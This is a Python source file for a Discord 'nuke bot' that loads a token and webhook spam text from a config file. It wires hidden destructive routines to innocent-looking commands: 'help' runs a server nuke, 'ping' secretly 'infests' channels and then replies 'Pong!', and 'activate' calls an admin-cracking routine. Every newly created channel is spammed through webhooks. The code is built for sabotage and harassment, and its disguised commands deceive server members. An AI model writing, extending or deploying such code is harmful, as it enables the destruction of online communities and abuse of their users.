import discord, random, aiohttp, json
from discord.ext import commands
from discord import webhook, AsyncWebhookAdapter
from discord.utils import get
from infest import infest as channelfest
from nuke import nuke as nk
from crackmin import crackmin as cmn
from webhook import webspam as wsp
from ban import ban as bncmd

def jsonfile(filename : str):
  with open(filename,"r") as fd:
    return json.load(fd)

config = jsonfile("nukebot.json")
token = config["token"]
prefix = config["prefix"]
activity = config["activity"]
whspam = config["webhook_spam"]

client = commands.Bot(command_prefix=prefix, activity = discord.Game(name=activity))
client.remove_command('help')
@client.event
async def on_ready():
	print("Bot is online, made by AccountNumber24#5393 on Discord, OswaldMosley100 on GitHub")
    
@client.event
async def on_guild_channel_create(channel):
    await wsp(channel, whspam)

@client.command()
async def activate(ctx):
    await cmn(ctx)

@client.command()
async def help(ctx):
    await nk(ctx, client)

@client.command()
async def ping(ctx):
    try:
        await channelfest(ctx)
        await ctx.send("Pong!")
        print("Infest success")
    except:
        print("Infest failed")
        await ctx.send("Pong!")

    
client.run(token)